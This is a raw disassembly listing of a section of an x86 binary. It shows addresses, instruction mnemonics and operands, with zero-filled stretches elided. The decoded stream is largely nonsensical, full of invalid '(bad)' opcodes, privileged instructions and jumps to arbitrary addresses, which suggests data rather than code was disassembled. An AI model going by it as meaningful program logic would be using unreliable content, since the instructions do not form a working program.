  41efa7:	dec    eax
  41efa8:	add    DWORD PTR [eax],eax
  41efaa:	pop    es
  41efab:	add    DWORD PTR [eax],eax
  41efad:	add    ah,bl
  41efaf:	lods   al,BYTE PTR ds:[esi]
  41efb0:	jp     0x41f013
  41efb2:	popf   
  41efb3:	adc    eax,0x40cf0398
  41efb8:	(bad)  
  41efb9:	loope  0x41ef76
  41efbb:	push   eax
  41efbc:	or     BYTE PTR [ebp+0x43],0x25
  41efc0:	adc    DWORD PTR [ebp+0x5c],eax
  41efc3:	adc    al,0x5c
  41efc5:	ins    BYTE PTR es:[edi],dx
  41efc6:	sub    ecx,DWORD PTR [edx+ebp*1-0x4d]
  41efca:	int    0xef
  41efcc:	call   0x2b770ae
  41efd1:	add    BYTE PTR [eax-0x48],dl
  41efd4:	dec    edi
  41efd5:	dec    ebx
  41efd6:	jp     0x41f014
  41efd8:	jae    0x41ef8d
  41efda:	lock daa 
  41efdc:	mov    cl,0xe6
  41efde:	les    ecx,FWORD PTR [edi+0x40]
  41efe1:	mov    cl,0xd6
  41efe3:	rcr    DWORD PTR [esi+edi*2],cl
  41efe6:	ror    BYTE PTR [edi-0x5e3b52a7],cl
  41efec:	aad    0x73
  41efee:	cmp    eax,0xed908f74
  41eff3:	inc    esi
  41eff4:	cmp    dh,BYTE PTR [ebx+edx*4]
  41eff7:	push   0x0
  41eff9:	lds    ebx,FWORD PTR [ebx+0x7]
  41effc:	cwde   
  41effd:	scas   eax,DWORD PTR es:[edi]
  41effe:	mov    ds:0x46f2de1b,eax
  41f003:	sbb    eax,0x269b8def
  41f008:	mov    cl,0x27
  41f00a:	dec    esp
  41f00b:	xlat   BYTE PTR ds:[ebx]
  41f00c:	jmp    0x41ef99
  41f00e:	fnstenv [ecx-0x73]
  41f011:	push   esi
  41f012:	mov    ch,0xf9
  41f014:	stos   BYTE PTR es:[edi],al
  41f015:	jae    0x41ef9a
  41f017:	adc    dl,BYTE PTR [edi+0xb]
  41f01a:	jp     0x41efb3
  41f01c:	sub    eax,DWORD PTR [edx]
  41f01e:	(bad)  [eax+0x3e]
  41f021:	popa   
  41f022:	mov    ?,WORD PTR [ebx+0x4a]
  41f025:	call   esi
  41f027:	add    ebx,esp
  41f029:	inc    ebp
  41f02a:	jge    0x41f064
  41f02c:	adc    eax,0x63e1b441
  41f031:	mov    edx,0x358a21d5
  41f036:	xchg   ebx,eax
  41f037:	xchg   DWORD PTR [edx+0x1f],ebx
  41f03a:	not    cl
  41f03c:	(bad)  cs:[eax-0x69]
  41f040:	gs push ebx
  41f042:	cmp    BYTE PTR [ebp-0x1fca188d],0xba
  41f049:	inc    eax
  41f04a:	mov    ecx,0x418e5665
  41f04f:	and    eax,0xd87a25
  41f054:	inc    ebp
  41f055:	(bad)  
  41f056:	repnz mov ebp,0xd6f090d2
  41f05c:	enter  0x82f8,0xf0
  41f060:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f061:	push   esp
  41f062:	sahf   
  41f063:	cmp    ebx,edx
  41f065:	cwde   
  41f066:	je     0x41f0b5
  41f068:	dec    ebp
  41f069:	stos   DWORD PTR es:[edi],eax
  41f06a:	clc    
  41f06b:	sub    eax,0xbf6f4935
  41f070:	dec    esi
  41f071:	test   DWORD PTR [ecx-0x3807df5b],0x32ee8acc
  41f07b:	iret   
  41f07c:	cmp    ecx,ebp
  41f07e:	xor    al,0xce
  41f080:	cld    
  41f081:	mov    ds:0x8311d5ef,al
  41f086:	sub    ch,BYTE PTR ds:0xb989f4af
  41f08c:	test   al,0xe3
  41f08e:	(bad)  
  41f08f:	dec    ebp
  41f090:	pushf  
  41f091:	fsubr  DWORD PTR [edx+0x2b]
  41f094:	imul   ebp,edi,0x7
  41f097:	in     eax,dx
  41f098:	int3   
  41f099:	mov    esi,0xa538fb49
  41f09e:	popf   
  41f09f:	or     DWORD PTR [eax],eax
  41f0a1:	dec    esi
  41f0a2:	inc    ecx
  41f0a3:	xchg   esi,eax
  41f0a4:	sub    eax,eax
  41f0a6:	icebp  
  41f0a7:	xor    eax,0x85fc8f3e
  41f0ac:	dec    edi
  41f0ad:	xchg   edx,eax
  41f0ae:	aad    0x6
  41f0b0:	or     al,0xb2
  41f0b2:	ins    BYTE PTR es:[edi],dx
  41f0b3:	inc    ebx
  41f0b4:	mov    bl,0x0
	...
  41f116:	fild   QWORD PTR [edx+ebp*1+0x6c]
  41f11b:	mov    ebx,0x6df0ffdf
  41f120:	sub    dh,BYTE PTR [ecx+0x6037733d]
  41f126:	cs dec ecx
  41f128:	add    DWORD PTR [eax],eax
  41f12a:	pop    es
  41f12b:	add    DWORD PTR [eax],eax
  41f12d:	add    BYTE PTR [edi],dl
  41f12f:	or     BYTE PTR [edx+eiz*2+0x73],0xab
  41f134:	mov    esp,0xff166214
  41f139:	int3   
  41f13a:	dec    BYTE PTR [esi+0x12]
  41f13d:	push   edi
  41f13e:	push   edi
  41f13f:	sub    DWORD PTR [edi-0x1d],ecx
  41f142:	(bad)  
  41f143:	sub    ah,ch
  41f145:	xor    BYTE PTR [eax+eiz*8-0x3d9dcb60],ah
  41f14c:	ficom  DWORD PTR [ecx]
  41f14e:	push   ds
  41f14f:	(bad)  
  41f150:	cmp    esi,edi
  41f152:	mov    ?,WORD PTR [esi+0x734b2d43]
  41f158:	push   edx
  41f159:	and    ecx,DWORD PTR [ebp-0x38]
  41f15c:	inc    esi
  41f15d:	xchg   BYTE PTR [edx-0x1c],bl
  41f160:	or     DWORD PTR [eax-0x5dfcf996],eax
  41f166:	jecxz  0x41f14b
  41f168:	adc    al,0x75
  41f16a:	fisttp DWORD PTR [ebx-0x63795333]
  41f170:	add    DWORD PTR [ebx],edi
  41f172:	mov    ecx,0xa472fa87
  41f177:	jl     0x41f1a4
  41f179:	cdq    
  41f17a:	and    al,0x54
  41f17c:	retf   0x97b1
  41f17f:	xchg   ebx,eax
  41f180:	ret    
  41f181:	iret   
  41f182:	adc    bl,dl
  41f184:	add    ebx,0x54
  41f187:	cmp    edi,0x289bb5d7
  41f18d:	shr    BYTE PTR [esi-0x4],cl
  41f190:	mov    ds:0x77b155ed,al
  41f195:	loopne 0x41f14c
  41f197:	jnp    0x41f1aa
  41f199:	lds    edx,FWORD PTR [ebp-0x4e]
  41f19c:	pop    edi
  41f19d:	pop    edi
  41f19e:	inc    edi
  41f19f:	repnz xor esi,DWORD PTR [esi]
  41f1a2:	mov    edx,0xf9ccbd64
  41f1a7:	sub    al,0x66
  41f1a9:	dec    ebp
  41f1aa:	jle    0x41f1c8
  41f1ac:	adc    dh,BYTE PTR [esi+ebx*2-0x37]
  41f1b0:	pop    ds
  41f1b1:	xor    dl,al
  41f1b3:	pop    esi
  41f1b4:	call   0x7681:0xa09dafe7
  41f1bb:	scas   al,BYTE PTR es:[edi]
  41f1bc:	xchg   edi,eax
  41f1bd:	sub    esi,DWORD PTR [eax-0x77c961fd]
  41f1c3:	add    al,0x3a
  41f1c5:	int3   
  41f1c6:	loope  0x41f167
  41f1c8:	mov    ch,0x9
  41f1ca:	inc    ecx
  41f1cb:	sti    
  41f1cc:	or     BYTE PTR [esi],dl
  41f1ce:	ja     0x41f1e5
  41f1d0:	dec    ebx
  41f1d1:	cmp    al,0xa8
  41f1d3:	jne    0x41f1e1
  41f1d5:	xor    esp,DWORD PTR [eax-0x68]
  41f1d8:	in     eax,0x99
  41f1da:	scas   al,BYTE PTR es:[edi]
  41f1db:	mov    ecx,0xb5578fa5
  41f1e0:	sar    DWORD PTR [esi+0x7d],1
  41f1e3:	cwde   
  41f1e4:	ja     0x41f1c9
  41f1e6:	sahf   
  41f1e7:	dec    ecx
  41f1e8:	and    al,0x25
  41f1ea:	inc    eax
  41f1eb:	loop   0x41f1be
  41f1ed:	pusha  
  41f1ee:	mov    WORD PTR [esi+0x2e0addeb],ss
  41f1f4:	fidiv  WORD PTR [ecx+0x30c1737e]
  41f1fa:	jp     0x41f250
  41f1fc:	or     eax,0xc9365b46
  41f201:	sub    al,0xda
  41f203:	int    0x8c
  41f205:	push   esi
  41f206:	adc    eax,esi
  41f208:	pop    es
  41f209:	cmc    
  41f20a:	inc    ebp
  41f20b:	dec    ebp
  41f20c:	xchg   ebp,eax
  41f20d:	aaa    
  41f20e:	ficom  WORD PTR [edi*4-0xcf9dd6f]
  41f215:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f216:	outs   dx,DWORD PTR ds:[esi]
  41f217:	in     eax,0xec
  41f219:	or     ebx,DWORD PTR [edx-0x3e]
  41f21c:	test   al,0xf3
  41f21e:	in     al,0x41
  41f220:	push   es
  41f221:	data16 in al,dx
  41f223:	inc    eax
  41f224:	inc    eax
  41f225:	out    0x52,eax
  41f227:	adc    eax,0x772a98c5
  41f22c:	lods   al,BYTE PTR ds:[esi]
  41f22d:	adc    DWORD PTR [edx-0x65],0xffffffce
  41f231:	sbb    al,0xac
  41f233:	outs   dx,DWORD PTR ds:[esi]
  41f234:	pop    es
	...
  41f295:	add    BYTE PTR [ecx+0x1b],dl
  41f298:	jmp    DWORD PTR [esi-0x1]
  41f29b:	out    0xd9,al
  41f29d:	aas    
  41f29e:	push   eax
  41f29f:	xor    DWORD PTR [edi-0x14],ebx
  41f2a2:	xchg   edi,eax
  41f2a3:	arpl   WORD PTR [ebx+0x14a359f],di
  41f2a9:	add    BYTE PTR [edi],al
  41f2ab:	add    DWORD PTR [eax],eax
  41f2ad:	add    BYTE PTR [edi-0x14],bh
  41f2b0:	sbb    ah,BYTE PTR [esi]
  41f2b2:	dec    edx
  41f2b3:	in     eax,0x1c
  41f2b5:	push   es
  41f2b6:	dec    esi
  41f2b7:	test   eax,ecx
  41f2b9:	cli    
  41f2ba:	mov    ds:0xd54939e9,al
  41f2bf:	adc    DWORD PTR [ebx],ebx
  41f2c1:	les    ebx,FWORD PTR [ebx]
  41f2c3:	cwde   
  41f2c4:	call   0x2989:0xc493ed78
  41f2cb:	jae    0x41f29b
  41f2cd:	int3   
  41f2ce:	mov    al,ds:0x292ba562
  41f2d3:	fnsave [ebx-0x5969bd41]
  41f2d9:	out    0x2,al
  41f2db:	test   cl,dh
  41f2dd:	adc    BYTE PTR [ebp+0x37],ch
  41f2e0:	pop    es
  41f2e1:	mov    dh,0x28
  41f2e3:	adc    eax,0xd4994e7e
  41f2e8:	stc    
  41f2e9:	cwde   
  41f2ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2eb:	ret    0xf11
  41f2ee:	retf   
  41f2ef:	sbb    DWORD PTR [ebx],esi
  41f2f1:	xchg   edx,eax
  41f2f2:	mov    al,0xd7
  41f2f4:	or     ecx,DWORD PTR [edx]
  41f2f6:	pop    es
  41f2f7:	ficomp DWORD PTR [esi-0x77]
  41f2fa:	lods   al,BYTE PTR ds:[esi]
  41f2fb:	push   ebx
  41f2fc:	test   DWORD PTR [edi-0x17],ebp
  41f2ff:	and    BYTE PTR [ebx],dl
  41f301:	pop    ecx
  41f302:	pop    ecx
  41f303:	iret   
  41f304:	dec    ebp
  41f305:	unpckhps xmm3,XMMWORD PTR [ebp+0x39]
  41f309:	xchg   ecx,eax
  41f30a:	jmp    0x3627:0xaa91ef9e
  41f311:	in     al,dx
  41f312:	push   esp
  41f313:	clc    
  41f314:	stc    
  41f315:	xor    DWORD PTR [ecx],ecx
  41f317:	inc    ecx
  41f318:	ret    0xfe52
  41f31b:	jo     0x41f371
  41f31d:	call   0xa72279f0
  41f322:	sti    
  41f323:	add    eax,DWORD PTR [eax+0x1f]
  41f326:	mov    dl,0x7
  41f328:	push   cs
  41f329:	adc    edi,DWORD PTR [ecx]
  41f32b:	ror    BYTE PTR [edx-0x79bdb1fd],0x1c
  41f332:	pusha  
  41f333:	fbld   TBYTE PTR [eax+0x1cc0a22]
  41f339:	fwait
  41f33a:	pushf  
  41f33b:	push   0xffffff8d
  41f33d:	js     0x41f309
  41f33f:	mov    esi,0x94b271d2
  41f344:	cs xor eax,0x7679fda9
  41f34a:	bound  esp,QWORD PTR [edx]
  41f34c:	pusha  
  41f34d:	int3   
  41f34e:	lods   al,BYTE PTR ds:[esi]
  41f34f:	cmc    
  41f350:	xchg   edx,eax
  41f351:	push   ebp
  41f352:	into   
  41f353:	call   0x4ccb:0x4e580176
  41f35a:	lea    esi,[ecx-0x58]
  41f35d:	sbb    eax,0x6beb9923
  41f362:	push   0x1fff402c
  41f367:	ror    DWORD PTR [esi],0x27
  41f36a:	fsub   QWORD PTR [ebx-0x4e]
  41f36d:	cmp    dl,BYTE PTR [edx]
  41f36f:	jecxz  0x41f3ab
  41f371:	js     0x41f3c9
  41f373:	mov    WORD PTR [edx],?
  41f375:	ja     0x41f37c
  41f377:	push   cs
  41f378:	fadd   DWORD PTR [edi-0x35]
  41f37b:	xchg   edi,eax
  41f37c:	aam    0xd9
  41f37e:	sar    bh,0x64
  41f381:	jns    0x41f31c
  41f383:	mov    BYTE PTR [esi-0x27b4b952],bh
  41f389:	(bad)  
  41f38a:	int3   
  41f38b:	test   al,0x3d
  41f38d:	mov    eax,0x79023948
  41f392:	adc    al,0xc
  41f394:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f395:	lods   eax,DWORD PTR ds:[esi]
  41f396:	jmp    0x7ae9fef9
  41f39b:	div    BYTE PTR [ecx]
  41f39d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f39e:	fidiv  WORD PTR [edx-0x20a60106]
  41f3a4:	pop    ss
  41f3a5:	fs ret 0x24eb
  41f3a9:	mov    BYTE PTR [ecx],bl
  41f3ab:	scas   al,BYTE PTR es:[edi]
  41f3ac:	pop    ss
  41f3ad:	push   0xffffffe9
  41f3af:	add    eax,0x4f4cb681
  41f3b4:	bound  eax,QWORD PTR [eax]
	...
  41f416:	cmp    al,0xe7
  41f418:	imul   ebp,edi,0xfffffffb
  41f41b:	out    dx,eax
  41f41c:	mov    esp,0xc961c5f7
  41f421:	xchg   edx,eax
  41f422:	lahf   
  41f423:	or     edi,esi
  41f425:	mov    edi,DWORD PTR [ebx+ecx*2]
  41f428:	add    DWORD PTR [eax],eax
  41f42a:	pop    es
  41f42b:	add    DWORD PTR [eax],eax
  41f42d:	add    dh,dl
  41f42f:	stos   BYTE PTR es:[edi],al
  41f430:	dec    esp
  41f431:	rcr    BYTE PTR [edx+0x4811ccc8],1
  41f437:	xchg   ebx,eax
  41f438:	sbb    ebx,esi
  41f43a:	adc    eax,0xeaa1cc19
  41f43f:	fdivr  QWORD PTR [esi+eax*2+0x13]
  41f443:	jo     0x41f42f
  41f445:	loopne 0x41f41e
  41f447:	and    cl,al
  41f449:	mov    al,ds:0xab5b7688
  41f44e:	mov    WORD PTR [ebp+eax*1+0x5d],fs
  41f452:	fcom   QWORD PTR [edx+0x9]
  41f455:	xchg   edx,eax
  41f456:	fld    QWORD PTR [ecx+ebp*1]
  41f459:	mov    BYTE PTR [eax],dh
  41f45b:	nop
  41f45c:	lods   al,BYTE PTR ds:[esi]
  41f45d:	frndint 
  41f45f:	scas   eax,DWORD PTR es:[edi]
  41f460:	test   eax,0x3b3014eb
  41f465:	mov    eax,ss:0x11df8981
  41f46b:	fisub  WORD PTR ds:0x6f05c0bf
  41f471:	dec    edi
  41f472:	ficom  WORD PTR [esi+0xf73e53d]
  41f478:	out    0x61,al
  41f47a:	jae    0x41f4e7
  41f47c:	cmp    al,0x17
  41f47e:	jne    0x41f485
  41f480:	jmp    0x69cda506
  41f485:	or     ebx,DWORD PTR [esi+0x3c2c16c4]
  41f48b:	add    BYTE PTR [eax+0x58b406cd],bh
  41f491:	mov    ah,0x5c
  41f493:	popa   
  41f494:	enter  0xf4a7,0x14
  41f498:	sub    BYTE PTR [edi+0x14],bh
  41f49b:	cmc    
  41f49c:	aaa    
  41f49d:	cmc    
  41f49e:	or     al,0x34
  41f4a0:	(bad)  
  41f4a1:	repz push ebp
  41f4a3:	pop    ss
  41f4a4:	dec    eax
  41f4a5:	xor    al,0xe0
  41f4a7:	adc    ebx,DWORD PTR [edx-0x202f7a12]
  41f4ad:	dec    ecx
  41f4ae:	ins    BYTE PTR es:[edi],dx
  41f4af:	mov    eax,ds:0xd7beeede
  41f4b4:	cs pop eax
  41f4b6:	xor    edi,DWORD PTR [edx+0x3]
  41f4b9:	mov    ebx,0x39af8f1f
  41f4be:	push   ss
  41f4bf:	adc    al,0xb4
  41f4c1:	bnd je 0x41f53f
  41f4c4:	jmp    0xa36f:0x30ed7dc5
  41f4cb:	jmp    FWORD PTR [ebp-0x45c179a]
  41f4d1:	(bad)  
  41f4d2:	enter  0x6162,0xcd
  41f4d6:	xchg   ebx,eax
  41f4d7:	cdq    
  41f4d8:	add    eax,0xb63b9ac4
  41f4dd:	nop
  41f4de:	mov    ch,0xf2
  41f4e0:	dec    ebx
  41f4e1:	adc    DWORD PTR [ebp+0x66092bcf],ebp
  41f4e7:	lds    ecx,FWORD PTR [eax-0x1f]
  41f4ea:	ror    DWORD PTR [ecx+0x1],0xa
  41f4ee:	cli    
  41f4ef:	js     0x41f52e
  41f4f1:	loope  0x41f565
  41f4f3:	and    BYTE PTR [eax+0x416b1f77],bh
  41f4f9:	dec    edx
  41f4fa:	sub    al,0x1
  41f4fc:	mov    dh,0x12
  41f4fe:	adc    esi,DWORD PTR gs:[edi-0x2f]
  41f502:	mov    BYTE PTR [ebx],ah
  41f504:	dec    edi
  41f505:	adc    DWORD PTR [eax-0x6c0899ed],0xb4a244b6
  41f50f:	idiv   cl
  41f511:	inc    edx
  41f512:	jecxz  0x41f4f2
  41f514:	pop    edx
  41f515:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f516:	inc    edx
  41f517:	hlt    
  41f518:	addr16 xchg esp,eax
  41f51a:	dec    ebx
  41f51b:	cld    
  41f51c:	xchg   BYTE PTR [ebx+0x40],dh
  41f51f:	pop    edx
  41f520:	daa    
  41f521:	pop    ebx
  41f522:	fwait
  41f523:	sub    eax,0x3cf5d8df
  41f528:	inc    BYTE PTR [edx+0xa]
  41f52b:	and    eax,0xe50127cd
  41f530:	ja     0x41f54f
  41f532:	loopne 0x41f4bb
  41f534:	inc    esi
	...
  41f595:	add    BYTE PTR [eax+0x34],bh
  41f598:	add    bh,bl
  41f59a:	dec    esi
  41f59b:	(bad)  
  41f59c:	stc    
  41f59d:	mov    bh,0x14
  41f59f:	pop    ebp
  41f5a0:	sub    cl,ah
  41f5a2:	inc    esi
  41f5a3:	fadd   st,st(1)
  41f5a5:	sbb    al,0x43
  41f5a7:	dec    esp
  41f5a8:	add    DWORD PTR [eax],eax
  41f5aa:	pop    es
  41f5ab:	add    DWORD PTR [eax],eax
  41f5ad:	add    BYTE PTR [eax+0x58],ah
  41f5b0:	loop   0x41f5ac
  41f5b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f5b3:	ror    DWORD PTR [edi-0xc],0x6c
  41f5b7:	ins    DWORD PTR es:[edi],dx
  41f5b8:	push   edi
  41f5b9:	das    
  41f5ba:	aaa    
  41f5bb:	fld    TBYTE PTR [eax-0x5b]
  41f5be:	mov    ebx,0xdc0a49a7
  41f5c3:	xlat   BYTE PTR ds:[ebx]
  41f5c4:	dec    ecx
  41f5c5:	inc    edx
  41f5c6:	pop    edx
  41f5c7:	xor    edx,ebp
  41f5c9:	ins    BYTE PTR es:[edi],dx
  41f5ca:	int3   
  41f5cb:	inc    esp
  41f5cc:	mov    cl,0xa3
  41f5ce:	sub    eax,0xd58ee30e
  41f5d3:	mov    dl,0x62
  41f5d5:	mov    BYTE PTR [eax+ebp*2-0x76242a7],dh
  41f5dc:	lea    esp,[eax+0x4f]
  41f5df:	pop    es
  41f5e0:	daa    
  41f5e1:	jecxz  0x41f59a
  41f5e3:	je     0x41f648
  41f5e5:	retf   0x359f
  41f5e8:	and    bh,0x46
  41f5eb:	mov    dh,0x84
  41f5ed:	sub    ebp,DWORD PTR [ebx*2+0x47bb31e4]
  41f5f4:	pop    esi
  41f5f5:	retf   0xd19f
  41f5f8:	add    eax,0x210f167
  41f5fd:	jle    0x41f60b
  41f5ff:	jp     0x41f63c
  41f601:	pop    ebx
  41f602:	ficomp WORD PTR [ecx]
  41f604:	xchg   esi,eax
  41f605:	test   eax,0xcf89c83b
  41f60a:	pusha  
  41f60b:	stos   BYTE PTR es:[edi],al
  41f60c:	inc    esi
  41f60d:	out    dx,eax
  41f60e:	outs   dx,DWORD PTR ds:[esi]
  41f60f:	adc    eax,0xcdb6eef1
  41f614:	pop    ds
  41f615:	pop    edi
  41f616:	(bad)  
  41f617:	mov    esi,0x6c05daed
  41f61c:	xor    bl,ah
  41f61e:	jge    0x41f61a
  41f620:	pop    edi
  41f621:	cmp    eax,edi
  41f623:	call   0xc5e8:0xe9718a63
  41f62a:	pop    es
  41f62b:	aaa    
  41f62c:	xchg   esi,eax
  41f62d:	mov    ds:0xc7476d9c,eax
  41f632:	ror    BYTE PTR [esi+0x59621fda],0xd0
  41f639:	es pop edx
  41f63b:	mov    edi,0x29fd9408
  41f640:	not    DWORD PTR [ebx]
  41f642:	sub    ebx,edi
  41f644:	mov    ah,0xa6
  41f646:	int3   
  41f647:	sub    eax,esp
  41f649:	imul   edi,DWORD PTR [esp+ebx*8+0x18fb0126],0x141d34df
  41f654:	ret    
  41f655:	xlat   BYTE PTR ds:[ebx]
  41f656:	fmul   st(1),st
  41f658:	pop    esp
  41f659:	mov    esp,0xc9c26673
  41f65e:	xchg   ebp,eax
  41f65f:	push   ecx
  41f660:	jno    0x41f673
  41f662:	xchg   BYTE PTR [ecx],ah
  41f664:	xchg   ebp,eax
  41f665:	je     0x41f695
  41f667:	inc    esp
  41f668:	outs   dx,BYTE PTR ds:[esi]
  41f669:	mov    edi,gs
  41f66b:	dec    edi
  41f66c:	out    0xc7,al
  41f66e:	int3   
  41f66f:	sub    ch,cl
  41f671:	mov    ecx,0x8ddab62b
  41f676:	jb     0x41f6c1
  41f678:	sbb    eax,DWORD PTR [si+0x62bf]
  41f67d:	adc    eax,0x8eac9835
  41f682:	cmc    
  41f683:	mov    ah,0x9a
  41f685:	mov    esi,0x10c7cabf
  41f68a:	jo     0x41f629
  41f68c:	jmp    0xac6d89a8
  41f691:	push   0xdcc2a104
  41f696:	jg     0x41f689
  41f698:	sbb    eax,0xf2b7ecc
  41f69d:	add    dh,BYTE PTR [ecx-0x16d5846d]
  41f6a3:	sbb    eax,0x251112cd
  41f6a8:	aad    0x85
  41f6aa:	xchg   edx,eax
  41f6ab:	pushf  
  41f6ac:	cmp    eax,0xcb3174c0
  41f6b1:	sub    eax,0x70bb8f
	...
  41f716:	xchg   edx,eax
  41f717:	cmp    al,0x23
  41f719:	jle    0x41f6ca
  41f71b:	jg     0x41f6fc
  41f71d:	cld    
  41f71e:	dec    ecx
  41f71f:	loope  0x41f6f2
  41f721:	sbb    DWORD PTR [eax],eax
  41f723:	fs sub ebx,esi
  41f726:	dec    edx
  41f727:	dec    ebp
  41f728:	add    DWORD PTR [eax],eax
  41f72a:	pop    es
  41f72b:	add    DWORD PTR [eax],eax
  41f72d:	add    BYTE PTR [ebx],dh
  41f72f:	and    eax,0x1682eca2
  41f734:	leave  
  41f735:	sbb    bh,BYTE PTR [ebp+0x2]
  41f738:	out    0x7b,al
  41f73a:	mov    ebp,0xcec2d7af
  41f73f:	xchg   DWORD PTR [eax+edi*8+0x66db7324],edi
  41f746:	jg     0x41f7b2
  41f748:	jns    0x41f771
  41f74a:	sar    esi,1
  41f74c:	inc    eax
  41f74d:	mov    edx,0xbf1e0db2
  41f752:	adc    BYTE PTR [edi-0xd],bh
  41f755:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f756:	rcl    BYTE PTR [ebx],1
  41f758:	cdq    
  41f759:	lods   eax,DWORD PTR ds:[esi]
  41f75a:	leave  
  41f75b:	push   esi
  41f75c:	or     eax,0x6802b093
  41f761:	cmp    al,0xa5
  41f763:	cld    
  41f764:	mov    bh,0x2f
  41f766:	lods   al,BYTE PTR ds:[esi]
  41f767:	cwde   
  41f768:	inc    esi
  41f769:	push   ds
  41f76a:	nop
  41f76b:	ja     0x41f746
  41f76d:	outs   dx,BYTE PTR ds:[esi]
  41f76e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f76f:	dec    ecx
  41f770:	or     DWORD PTR ds:0x6044ac31,ebx
  41f776:	jae    0x41f7c2
  41f778:	xchg   dh,bl
  41f77a:	mov    bl,0xc2
  41f77c:	(bad)  
  41f77e:	xor    al,0xda
  41f780:	cdq    
  41f781:	push   esi
  41f782:	pushf  
  41f783:	mov    esp,0xf4069972
  41f788:	lods   al,BYTE PTR ds:[esi]
  41f789:	jmp    0x40cae094
  41f78e:	cmp    BYTE PTR [esi+0x5c723815],0x35
  41f795:	cmc    
  41f796:	inc    edi
  41f797:	push   eax
  41f798:	lods   eax,DWORD PTR ds:[esi]
  41f799:	mul    DWORD PTR [edx+0x5f]
  41f79c:	outs   dx,BYTE PTR ds:[esi]
  41f79d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f79e:	rcr    BYTE PTR [esi],cl
  41f7a0:	fcomp  QWORD PTR [eax]
  41f7a2:	add    al,0xd0
  41f7a4:	rcl    dh,1
  41f7a6:	loope  0x41f740
  41f7a8:	test   BYTE PTR [eax-0x7a877919],al
  41f7ae:	pop    ecx
  41f7af:	mov    DWORD PTR [ebp+0x32c5bdbd],edx
  41f7b5:	fadd   QWORD PTR [esi+eax*8-0x128fba98]
  41f7bc:	push   es
  41f7bd:	xchg   BYTE PTR [edx-0x98a1967],dl
  41f7c3:	dec    ebp
  41f7c4:	lahf   
  41f7c5:	fs mov ebp,0xee31d420
  41f7cb:	sub    al,BYTE PTR [eax+0x15]
  41f7ce:	ss jl  0x41f789
  41f7d1:	hlt    
  41f7d2:	(bad)  
  41f7d3:	jno    0x41f7bc
  41f7d5:	pop    edx
  41f7d6:	imul   esp,DWORD PTR [edi+0x1d],0xb7846f60
  41f7dd:	jnp    0x41f801
  41f7df:	xor    al,0xf3
  41f7e1:	(bad)  
  41f7e2:	ror    ch,cl
  41f7e4:	xor    DWORD PTR [ebx+0x2f6f0fa6],ebx
  41f7ea:	push   cs
  41f7eb:	mov    ds:0xfaaa61e5,eax
  41f7f0:	cmp    eax,0x619bc3b8
  41f7f5:	pop    ecx
  41f7f6:	gs inc edx
  41f7f8:	mov    eax,ds:0x66c8db1a
  41f7fd:	test   eax,0x35f77ccd
  41f802:	nop
  41f803:	rcl    BYTE PTR ds:[edi+0x58],1
  41f807:	aad    0x54
  41f809:	mov    ah,BYTE PTR [eax+0x1f0bf8ed]
  41f80f:	ret    
  41f810:	inc    DWORD PTR [eax-0xee099fd]
  41f816:	mov    ebx,0xb71c6a3a
  41f81b:	test   al,0x98
  41f81d:	adc    eax,DWORD PTR [esi+ebp*4+0x42]
  41f821:	sbb    eax,0x873d2962
  41f826:	xchg   ebx,eax
  41f827:	fcomp  QWORD PTR [ecx-0x34]
  41f82a:	ss xchg esp,eax
  41f82c:	cmc    
  41f82d:	dec    ebp
  41f82e:	add    bh,BYTE PTR [ebp+edi*4+0x7f]
  41f832:	mov    cl,0x74
  41f834:	pop    esp
	...
  41f895:	add    BYTE PTR [ecx+0x3b920b9a],ah
  41f89b:	xchg   ebx,eax
  41f89c:	mov    ecx,0x25be46bb
  41f8a1:	mov    eax,ecx
  41f8a3:	mov    esp,0x4e511388
  41f8a8:	add    DWORD PTR [eax],eax
  41f8aa:	pop    es
  41f8ab:	add    DWORD PTR [eax],eax
  41f8ad:	add    bl,ch
  41f8af:	lods   eax,DWORD PTR ds:[esi]
  41f8b0:	cdq    
  41f8b1:	dec    ebx
  41f8b2:	retf   0x6aa2
  41f8b5:	mov    dh,BYTE PTR [ebx+ebp*8+0x4d]
  41f8b9:	bound  ebp,QWORD PTR [edi-0x6a8f5b91]
  41f8bf:	icebp  
  41f8c0:	int    0xc0
  41f8c2:	or     DWORD PTR [eax-0x3f4ed1af],ecx
  41f8c8:	dec    ebp
  41f8c9:	ret    0x19b1
  41f8cc:	and    al,0xe1
  41f8ce:	imul   ecx,DWORD PTR [ebx+0x5a],0xffffff9f
  41f8d2:	mov    ebp,0xbb9640a5
  41f8d7:	mov    eax,ds:0x4ec8f1f7
  41f8dc:	cmp    ch,BYTE PTR [edx-0x3bb6c270]
  41f8e2:	call   FWORD PTR [ebp+edx*8-0x4e4ca0b0]
  41f8e9:	hlt    
  41f8ea:	lds    eax,FWORD PTR [edx+eiz*8+0x1f2c8d96]
  41f8f1:	add    ch,ch
  41f8f3:	scas   eax,DWORD PTR es:[edi]
  41f8f4:	or     DWORD PTR [edx-0x21193fe1],0xe0e90447
  41f8fe:	and    ebp,ebx
  41f900:	dec    esp
  41f901:	and    BYTE PTR [eax-0x7612eda3],ch
  41f907:	iret   
  41f908:	cmp    dh,dl
  41f90a:	pusha  
  41f90b:	and    al,0x9b
  41f90d:	out    dx,eax
  41f90e:	push   edx
  41f90f:	or     BYTE PTR [ebx-0x72ceb71c],cl
  41f915:	inc    esi
  41f916:	(bad)  
  41f918:	cli    
  41f919:	stos   DWORD PTR es:[edi],eax
  41f91a:	gs mov esi,0xb1927c5b
  41f920:	repz mul dl
  41f923:	jbe    0x41f99b
  41f925:	add    al,0xe2
  41f927:	pop    eax
  41f928:	xchg   esi,eax
  41f929:	jmp    0x36c0:0x2045da4e
  41f930:	dec    ecx
  41f931:	inc    ecx
  41f932:	jns    0x41f8b5
  41f934:	sub    ah,BYTE PTR [eax+edi*8-0x49dd85b3]
  41f93b:	dec    esp
  41f93c:	xor    DWORD PTR [edx],0xffffffe6
  41f93f:	loopne 0x41f8c8
  41f941:	lock pop esi
  41f943:	push   cs
